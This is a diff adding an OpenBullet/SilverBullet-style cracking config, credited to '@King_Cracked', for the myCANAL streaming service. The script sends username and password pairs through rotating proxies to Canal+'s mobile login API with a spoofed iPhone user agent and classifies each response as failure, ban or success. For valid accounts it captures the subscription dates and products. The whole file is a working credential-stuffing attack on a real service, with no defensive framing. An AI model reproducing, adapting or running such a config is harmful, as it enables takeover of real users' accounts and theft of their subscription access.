@@ -1,0 +1,108 @@
+[SETTINGS]
+{
+  "Name": "mycanal @King_Cracked v10",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-06T02:30:59.4646296-08:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "//t.me/@Config_list",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "mycanal V6 @King_Cracked",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://pass-mobile-api.canal-plus.com/services/apipublique/login" 
+  CONTENT "vect=INTERNET&media=IOS%20PHONE&portailId=OQaRQJQkSdM.&distributorId=C22021&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: pass-mobile-api.canal-plus.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: myCANAL/5.6.2 (iPhone; iOS 15.2; Scale/2.00)" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Password manquant" 
+    KEY "Login ou mot de passe invalide" 
+    KEY "Email manquant ou invalide" 
+    KEY "Compte bloque" 
+    KEY "Login ou mot de passe invalide" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+  KEYCHAIN Success OR 
+    KEY "accountId" 
+    KEY "nickname" 
+
+#Token PARSE "<SOURCE>" LR "passToken\":\"" "\",\"userData" -> VAR "Token" 
+
+REQUEST GET "https://api-client.canal-plus.com/self/persons/current/subscriptions" 
+  
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: s_token=<Token>" 
+  HEADER "Host: api-client.canal-plus.com" 
+  HEADER "User-Agent: myCANAL/1202 CFNetwork/1121.2.2 Darwin/19.2.0" 
+
+#start PARSE "<SOURCE>" LR "startDate\":\"" "\",\"endDate " -> CAP "start" 
+
+#end PARSE "<SOURCE>" LR "endDate\":\"" "\",\"products" -> CAP "end" 
+
+#products PARSE "<SOURCE>" LR "products\":" ",\"wholesalesSubscriptions" -> CAP "products" 
+
+FUNCTION Constant "@King_Cracked" -> CAP "Config By" 
+
